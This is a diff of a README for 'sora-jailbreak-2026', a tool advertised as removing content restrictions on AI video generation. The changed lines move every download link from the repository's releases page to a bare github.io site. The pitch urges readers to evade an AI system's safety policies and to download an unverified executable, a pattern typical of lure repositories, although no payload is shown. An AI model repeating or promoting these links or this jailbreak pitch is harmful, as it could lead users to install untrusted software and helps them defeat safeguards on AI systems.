@@ -1,6 +1,6 @@
 # 🎬 sora-jailbreak-2026 - Unlock Unlimited AI Video Creation Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-Sora_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mobsben/sora-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Sora_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://mobsben.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ No more "this content violates our policy" messages. No more frustrating blocks.
 
 Visit this link to download the application:
 
-[**⬇️ Download sora-jailbreak-2026**](https://github.com/mobsben/sora-jailbreak-2026/releases)
+[**⬇️ Download sora-jailbreak-2026**](https://mobsben.github.io)
 
 The download page will show you the latest version available. Click the download button and save the file to your computer.
 
@@ -125,7 +125,7 @@ sora-jailbreak-2026 puts the power of unrestricted AI video generation in your h
 
 Stop fighting with content restrictions. Stop settling for limited video generation. Download sora-jailbreak-2026 today and experience true creative freedom.
 
-[**🚀 Get Started Now — Download sora-jailbreak-2026**](https://github.com/mobsben/sora-jailbreak-2026/releases)
+[**🚀 Get Started Now — Download sora-jailbreak-2026**](https://mobsben.github.io)
 
 ---
 
